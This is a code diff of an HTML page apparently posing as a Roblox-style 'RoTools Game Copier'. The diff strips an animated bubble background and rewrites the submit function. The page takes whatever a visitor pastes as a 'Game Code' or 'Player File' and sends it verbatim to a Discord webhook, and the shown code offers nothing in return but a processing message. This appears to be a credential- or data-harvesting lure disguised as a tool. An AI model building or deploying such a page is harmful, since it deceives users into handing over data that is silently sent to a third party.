@@ -18,57 +18,6 @@
             min-height: 100vh;
             overflow-x: hidden;
             cursor: none;
-            position: relative;
-        }
-
-        /* Animated Bubbles Background */
-        .bubbles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
-
-        .bubble {
-            position: absolute;
-            background: rgba(59, 130, 246, 0.1);
-            border: 1px solid rgba(59, 130, 246, 0.2);
-            border-radius: 50%;
-            animation: float-bubble 15s infinite linear;
-            opacity: 0.7;
-        }
-
-        .bubble:nth-child(1) { left: 10%; width: 20px; height: 20px; animation-delay: 0s; animation-duration: 12s; }
-        .bubble:nth-child(2) { left: 20%; width: 15px; height: 15px; animation-delay: 2s; animation-duration: 16s; }
-        .bubble:nth-child(3) { left: 35%; width: 25px; height: 25px; animation-delay: 4s; animation-duration: 14s; }
-        .bubble:nth-child(4) { left: 50%; width: 18px; height: 18px; animation-delay: 6s; animation-duration: 18s; }
-        .bubble:nth-child(5) { left: 65%; width: 22px; height: 22px; animation-delay: 8s; animation-duration: 13s; }
-        .bubble:nth-child(6) { left: 80%; width: 16px; height: 16px; animation-delay: 10s; animation-duration: 15s; }
-        .bubble:nth-child(7) { left: 15%; width: 30px; height: 30px; animation-delay: 1s; animation-duration: 20s; }
-        .bubble:nth-child(8) { left: 25%; width: 12px; height: 12px; animation-delay: 3s; animation-duration: 11s; }
-        .bubble:nth-child(9) { left: 45%; width: 28px; height: 28px; animation-delay: 5s; animation-duration: 17s; }
-        .bubble:nth-child(10) { left: 75%; width: 14px; height: 14px; animation-delay: 7s; animation-duration: 19s; }
-        .bubble:nth-child(11) { left: 85%; width: 20px; height: 20px; animation-delay: 9s; animation-duration: 12s; }
-        .bubble:nth-child(12) { left: 5%; width: 24px; height: 24px; animation-delay: 11s; animation-duration: 16s; }
-
-        @keyframes float-bubble {
-            0% {
-                transform: translateY(100vh) rotate(0deg);
-                opacity: 0;
-            }
-            10% {
-                opacity: 0.7;
-            }
-            90% {
-                opacity: 0.7;
-            }
-            100% {
-                transform: translateY(-100px) rotate(360deg);
-                opacity: 0;
-            }
         }
 
         /* Enhanced animations and polish */
@@ -81,7 +30,6 @@
             text-align: center;
             position: relative;
             background: radial-gradient(ellipse at center, rgba(59, 130, 246, 0.1) 0%, transparent 70%);
-            z-index: 2;
         }
 
         .logo {
@@ -195,8 +143,6 @@
         .features {
             padding: 100px 0;
             text-align: center;
-            position: relative;
-            z-index: 2;
         }
 
         .features h2 {
@@ -275,8 +221,6 @@
         .process-section {
             padding: 50px 0;
             text-align: center;
-            position: relative;
-            z-index: 2;
         }
 
         .video-container {
@@ -441,8 +385,6 @@
             color: #64748b;
             border-top: 1px solid rgba(59, 130, 246, 0.1);
             margin-top: 100px;
-            position: relative;
-            z-index: 2;
         }
 
         /* Success Message */
@@ -518,22 +460,6 @@
     </style>
 </head>
 <body>
-    <!-- Animated Bubbles Background -->
-    <div class="bubbles">
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-        <div class="bubble"></div>
-    </div>
-
     <!-- Hero Section -->
     <section class="hero">
         <div class="container">
@@ -585,7 +511,7 @@
                 <input 
                     type="text" 
                     class="player-input" 
-                    placeholder="Enter your Game Code" 
+                    placeholder="Enter your Player File" 
                     id="playerInput"
                 >
                 <button class="process-btn" onclick="startProcess()" id="processBtn">
@@ -672,8 +598,7 @@
             const successMsg = document.getElementById('successMessage');
             const errorMsg = document.getElementById('errorMessage');
             
-            // Allow any text input, no minimum length required
-            if (!input.value) {
+            if (!input.value.trim()) {
                 alert('Please enter a Game Code');
                 return;
             }
@@ -683,30 +608,39 @@
             btn.textContent = 'Processing...';
 
             try {
-                // Create a text file from the input
-                const gameCode = input.value;
-                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-                const fileName = `game-code-${timestamp}.txt`;
-                
-                // Create a Blob with the game code content
-                const blob = new Blob([gameCode], { type: 'text/plain' });
-                
-                // Create FormData for multipart upload
-                const formData = new FormData();
-                formData.append('file', blob, fileName);
-                
-                // Create the message content
-                const messageContent = {
-                    content: `🎮 **New RoTools Game Code Submission**\n📁 **File:** ${fileName}\n📅 **Submitted:** ${new Date().toLocaleString()}\n🔧 **Tool:** RoTools Game Copier`
+                // Create the Discord message payload
+                const payload = {
+                    content: `🎮 **New RoTools Game Code Submission**`,
+                    embeds: [{
+                        title: "Game Code Details",
+                        description: `\`\`\`\n${input.value}\n\`\`\``,
+                        color: 3447003, // Blue color
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "RoTools Game Copier"
+                        },
+                        fields: [
+                            {
+                                name: "📅 Submitted At",
+                                value: new Date().toLocaleString(),
+                                inline: true
+                            },
+                            {
+                                name: "🔧 Tool Used",
+                                value: "RoTools Game Copier",
+                                inline: true
+                            }
+                        ]
+                    }]
                 };
-                
-                // Add the message content to form data
-                formData.append('payload_json', JSON.stringify(messageContent));
 
-                // Send to Discord webhook with file attachment
+                // Send to Discord webhook
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
                 });
 
                 if (response.ok) {
